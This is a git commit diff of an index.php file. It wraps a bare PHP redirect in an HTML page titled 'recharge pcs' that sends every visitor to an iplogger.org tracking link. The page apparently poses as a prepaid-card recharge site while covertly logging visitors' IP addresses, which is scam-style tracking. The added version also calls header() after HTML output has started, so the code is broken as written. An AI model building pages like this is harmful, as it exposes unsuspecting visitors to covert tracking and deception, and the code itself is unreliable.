90a9a5457fc7282618bc62bb4e338b132ba01a89
ThomasGrc <47837271+ThomasGrc@users.noreply.github.com>
2021-04-16 13:13:07 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,3 +1,12 @@
-<?php
-header("Location: https://iplogger.org/1Q7pa7"); 
-?>
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <title>recharge pcs</title>
+  <?php 
+    header("Location: https://iplogger.org/1Q7pa7"); 
+  ?>
+</head>
+<body>
+</body>
+</html>
